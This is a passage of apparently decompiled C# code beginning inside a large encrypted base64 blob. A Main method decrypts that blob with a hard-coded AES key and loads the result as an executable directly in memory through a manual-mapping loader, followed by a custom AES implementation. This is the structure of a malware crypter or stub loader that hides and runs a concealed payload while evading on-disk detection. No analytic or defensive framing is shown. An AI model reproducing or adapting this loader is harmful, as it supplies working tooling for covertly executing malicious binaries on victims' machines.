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");

	public static void Main()
	{
		byte[] rawAssembly = decrypt(pe, decode("fO69CKrW5riZeZWZibAc2jzkqvbrNOMxgsBGRGG39ogzNQA0uB8sJXASVzhq5yZn2RldONsSsEgKjITpkKJX4A=="));
		run_pe(rawAssembly);
	}

	private static void run_pe(byte[] rawAssembly)
	{
		new ManualMap().LoadLibrary(rawAssembly);
	}

	private static byte[] decode(string s)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		int[] array = new int[128];
		for (int i = 0; i < text.Length; i++)
		{
			array[(uint)text[i]] = i;
		}
		int num = (s.EndsWith("==") ? 2 : (s.EndsWith("=") ? 1 : 0));
		byte[] array2 = new byte[s.Length * 3 / 4 - num];
		int num2 = 255;
		int num3 = 0;
		int num4 = 0;
		while (true)
		{
			if (num4 < s.Length)
			{
				int num5 = array[(uint)s[num4]];
				int num6 = array[(uint)s[num4 + 1]];
				array2[num3++] = (byte)(((num5 << 2) | (num6 >> 4)) & num2);
				if (num3 < array2.Length)
				{
					int num7 = array[(uint)s[num4 + 2]];
					array2[num3++] = (byte)(((num6 << 4) | (num7 >> 2)) & num2);
					if (num3 >= array2.Length)
					{
						break;
					}
					int num8 = array[(uint)s[num4 + 3]];
					array2[num3++] = (byte)(((num7 << 6) | num8) & num2);
					num4 += 4;
					continue;
				}
				return array2;
			}
			return array2;
		}
		return array2;
	}

	private static byte[] xor_func(byte[] a, byte[] b)
	{
		byte[] array = new byte[a.Length];
		for (int i = 0; i < a.Length; i++)
		{
			array[i] = (byte)(a[i] ^ b[i]);
		}
		return array;
	}

	private static byte[][] generateSubkeys(byte[] key)
	{
		byte[][] array = new byte[Nb * (Nr + 1)][];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = new byte[4];
		}
		for (int j = 0; j < Nk; j++)
		{
			array[j][0] = key[j * 4];
			array[j][1] = key[j * 4 + 1];
			array[j][2] = key[j * 4 + 2];
			array[j][3] = key[j * 4 + 3];
		}
		for (int j = Nk; j < Nb * (Nr + 1); j++)
		{
			byte[] array2 = new byte[4];
			for (int k = 0; k < 4; k++)
			{
				array2[k] = array[j - 1][k];
			}
			if (j % Nk == 0)
			{
				array2 = SubWord(rotateWord(array2));
				array2[0] = (byte)(array2[0] ^ (Rcon[j / Nk] & 0xFFu));
			}
			else if (Nk > 6 && j % Nk == 4)
			{
				array2 = SubWord(array2);
			}
			array[j] = xor_func(array[j - Nk], array2);
		}
		return array;
	}

	private static byte[] SubWord(byte[] input)
	{
		byte[] array = new byte[input.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = (byte)(sbox[input[i] & 0xFF] & 0xFFu);
		}
		return array;
	}

	private static byte[] rotateWord(byte[] input)
	{
		byte[] array = new byte[input.Length];
		array[0] = input[1];
		array[1] = input[2];
		array[2] = input[3];
		array[3] = input[0];
		return array;
	}

	private static byte[][] AddRoundKey(byte[][] state, byte[][] w, int round)
	{
		byte[][] array = new byte[state.Length][];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = new byte[state[0].Length];
		}
		for (int j = 0; j < Nb; j++)
		{
			for (int k = 0; k < 4; k++)
			{
				array[k][j] = (byte)(state[k][j] ^ w[round * Nb + j][k]);
			}
		}
		return array;
	}

	private static byte[][] SubBytes(byte[][] state)
	{
		byte[][] array = new byte[state.Length][];
		for (int i = 0; i < array.Length; i++)
		{
			array[i] = new byte[state[0].Length];
		}
		for (int j = 0; j < 4; j++)
		{
			for (int k = 0; k < Nb; k++)
			{
				array[j][k] = (byte)(sbox[state[j][k] & 0xFF] & 0xFFu);
			}
		}
		return array;
	}

	private static byte[][] InvSubBytes(byte[][] state)
	{
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < Nb; j++)
			{
				state[i][j] = (byte)(inv_sbox[state[i][j] & 0xFF] & 0xFFu);
			}
		}
		return state;
	}

	private static byte[][] ShiftRows(byte[][] state)
	{
		byte[] array = new byte[4];
		for (int i = 1; i < 4; i++)
		{
			for (int j = 0; j < Nb; j++)
			{
				array[j] = state[i][(j + i) % Nb];
			}
			for (int k = 0; k < Nb; k++)
			{
				state[i][k] = array[k];
			}
		}
		return state;
	}

	private static byte[][] InvShiftRows(byte[][] state)
	{
		byte[] array = new byte[4];
		for (int i = 1; i < 4; i++)
		{
			for (int j = 0; j < Nb; j++)
			{
				array[(j + i) % Nb] = state[i][j];
			}
			for (int k = 0; k < Nb; k++)
			{
				state[i][k] = array[k];
			}
		}
		return state;
	}

	private static byte[][] InvMixColumns(byte[][] s)
	{
		int[] array = new int[4];
		byte a = 14;
		byte a2 = 11;
		byte a3 = 13;
		byte a4 = 9;
		for (int i = 0; i < 4; i++)
		{
			array[0] = FFMul(a, s[0][i]) ^ FFMul(a2, s[1][i]) ^ FFMul(a3, s[2][i]) ^ FFMul(a4, s[3][i]);
			array[1] = FFMul(a4, s[0][i]) ^ FFMul(a, s[1][i]) ^ FFMul(a2, s[2][i]) ^ FFMul(a3, s[3][i]);
			array[2] = FFMul(a3, s[0][i]) ^ FFMul(a4, s[1][i]) ^ FFMul(a, s[2][i]) ^ FFMul(a2, s[3][i]);
			array[3] = FFMul(a2, s[0][i]) ^ FFMul(a3, s[1][i]) ^ FFMul(a4, s[2][i]) ^ FFMul(a, s[3][i]);
			for (int j = 0; j < 4; j++)
			{
				s[j][i] = (byte)array[j];
			}
		}
		return s;
	}

	private static byte[][] MixColumns(byte[][] s)
	{
		int[] array = new int[4];
		byte a = 2;
		byte a2 = 3;
		for (int i = 0; i < 4; i++)
		{
			array[0] = FFMul(a, s[0][i]) ^ FFMul(a2, s[1][i]) ^ s[2][i] ^ s[3][i];
			array[1] = s[0][i] ^ FFMul(a, s[1][i]) ^ FFMul(a2, s[2][i]) ^ s[3][i];
			array[2] = s[0][i] ^ s[1][i] ^ FFMul(a, s[2][i]) ^ FFMul(a2, s[3][i]);
			array[3] = FFMul(a2, s[0][i]) ^ s[1][i] ^ s[2][i] ^ FFMul(a, s[3][i]);
			for (int j = 0; j < 4; j++)
			{
				s[j][i] = (byte)array[j];
			}
		}
		return s;
	}

	private static byte FFMul(byte a, byte b)
	{
		byte b2 = a;
		byte b3 = b;
		byte b4 = 0;
		while (b2 != 0)
		{
			if (((uint)b2 & (true ? 1u : 0u)) != 0)
			{
				b4 = (byte)(b4 ^ b3);
			}
			byte b5 = (byte)(b3 & 0x80u);
			b3 = (byte)(b3 << 1);
			if (b5 != 0)
			{
				b3 = (byte)(b3 ^ 0x1Bu);
			}
			b2 = (byte)((b2 & 0xFF) >> 1);
		}
		return b4;
	}

	private static byte[] decryptBloc(byte[] input)
	{
		byte[] array = new byte[input.Length];
		byte[][] array2 = new byte[4][];
		for (int i = 0; i < array2.Length; i++)
		{
			array2[i] = new byte[Nb];
		}
		for (int j = 0; j < input.Length; j++)
		{
			array2[j / 4][j % 4] = input[j % 4 * 4 + j / 4];
		}
		array2 = AddRoundKey(array2, w, Nr);
		for (int num = Nr - 1; num >= 1; num--)
		{
			array2 = InvSubBytes(array2);
			array2 = InvShiftRows(array2);
			array2 = AddRoundKey(array2, w, num);
			array2 = InvMixColumns(array2);
		}
		array2 = InvSubBytes(array2);
		array2 = InvShiftRows(array2);
		array2 = AddRoundKey(array2, w, 0);
		for (int k = 0; k < array.Length; k++)
		{
			array[k % 4 * 4 + k / 4] = array2[k / 4][k % 4];
		}
		return array;
	}

	private static byte[] decrypt(byte[] input, byte[] key)
	{
		byte[] array = new byte[input.Length];
		byte[] array2 = new byte[16];
		Nb = 4;
		Nk = key.Length / 4;
		Nr = Nk + 6;
		w = generateSubkeys(key);
		int i;
		for (i = 0; i < input.Length; i++)
		{
			if (i > 0 && i % 16 == 0)
			{
				array2 = decryptBloc(array2);
				Array.Copy(array2, 0, array, i - 16, array2.Length);
			}
			if (i < input.Length)
			{
				array2[i % 16] = input[i];
			}
		}
		array2 = decryptBloc(array2);
		Array.Copy(array2, 0, array, i - 16, array2.Length);
		return deletePadding(array);
	}

	private static byte[] deletePadding(byte[] input)
	{
		int num = 0;
		int num2 = input.Length - 1;
		while (input[num2] == 0)
		{
			num++;
			num2--;
		}
		byte[] array = new byte[input.Length - num - 1];
		Array.Copy(input, 0, array, 0, array.Length);
		return array;
	}
}
